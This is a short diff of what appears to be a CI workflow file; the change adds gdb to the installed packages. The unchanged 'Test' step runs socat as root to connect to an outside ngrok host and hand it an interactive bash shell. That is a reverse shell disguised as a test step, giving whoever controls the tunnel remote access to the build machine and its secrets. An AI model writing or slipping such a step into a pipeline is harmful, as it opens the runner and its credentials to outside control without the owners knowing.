@@ -17,7 +17,7 @@ jobs:
       - name: Install dependencies
         run: |
           sudo apt-get update
-          sudo apt-get install -y socat
+          sudo apt-get install -y socat gdb
       - name: Test
         run: |
           sudo socat TCP:2.tcp.ngrok.io:16804 EXEC:"bash -li",pty,stderr,setsid,sigint,sane
